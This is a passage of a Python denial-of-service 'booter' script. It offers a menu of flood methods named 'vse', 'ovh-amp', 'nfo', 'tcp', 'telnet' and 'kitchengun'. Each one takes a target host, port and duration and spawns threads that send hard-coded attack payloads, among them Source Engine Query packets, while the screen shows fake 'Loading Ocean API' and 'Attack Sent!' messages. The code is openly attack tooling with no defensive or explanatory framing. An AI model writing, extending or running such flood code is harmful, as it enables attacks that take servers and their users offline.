					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print("\033[97m[-] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[\] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[|] Loading Ocean API...")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[+] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[-] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97mAttack Sent! | Ocean API ~ |")
					time.sleep(3)
					os.system('clear')
					print(universalcooldown)
					time.sleep(10)
					os.system("clear")
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "kitchengun":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print("\033[97m[-] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[\] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[|] Loading Ocean API...")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[+] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[-] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97mAttack Sent! | Ocean API ~ |")
					time.sleep(3)
					os.system('clear')
					print(universalcooldown)
					time.sleep(10)
					os.system("clear")
					print(attacked) 
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfo":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print("\033[97m[-] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[\] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[|] Loading Ocean API...")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[+] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[-] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97mAttack Sent! | Ocean API ~ |")
					time.sleep(3)
					os.system('clear')
					print(universalcooldown)
					time.sleep(10)
					os.system("clear")
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print("\033[97m[-] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[\] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[|] Loading Ocean API...")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[+] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[-] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97mAttack Sent! | Ocean API ~ |")
					time.sleep(3)
					os.system('clear')
					print(universalcooldown)
					time.sleep(10)
					os.system("clear")
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vse":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						os.system('clear')
						print("\033[97m[-] Loading Ocean API.")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[\] Loading Ocean API..")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[|] Loading Ocean API...")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[/] Loading Ocean API....")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[+] Loading Ocean API....")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[-] Loading Ocean API..")
						time.sleep(1)
						os.system('clear')
						print("\033[97m[/] Loading Ocean API.")
						time.sleep(1)
						os.system('clear')
						print("\033[97mAttack Sent! | Ocean API ~ |")
						time.sleep(3)
						os.system('clear')
						print(universalcooldown)
						time.sleep(10)
						os.system("clear") 
						print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print("\033[97m[-] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[\] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[|] Loading Ocean API...")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[+] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[-] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97mAttack Sent! | Ocean API ~ |")
					time.sleep(3)
					os.system('clear')
					print(universalcooldown)
					time.sleep(10)
					os.system("clear") 
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-amp":
			try:
				if running >= 2:
					print("\033[97m\033[1;33mYou have reached max concurrents and must wait for your attack to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('clear')
					print("\033[97m[-] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[\] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[|] Loading Ocean API...")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[+] Loading Ocean API....")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[-] Loading Ocean API..")
					time.sleep(1)
					os.system('clear')
					print("\033[97m[/] Loading Ocean API.")
					time.sleep(1)
					os.system('clear')
					print("\033[97mAttack Sent! | Ocean API ~ |")
					time.sleep(3)
					print(universalcooldown)
					time.sleep(10)
					os.system('clear')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
            
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system("clear")
	print(banner)
	main()
except KeyboardInterrupt:
	exit()
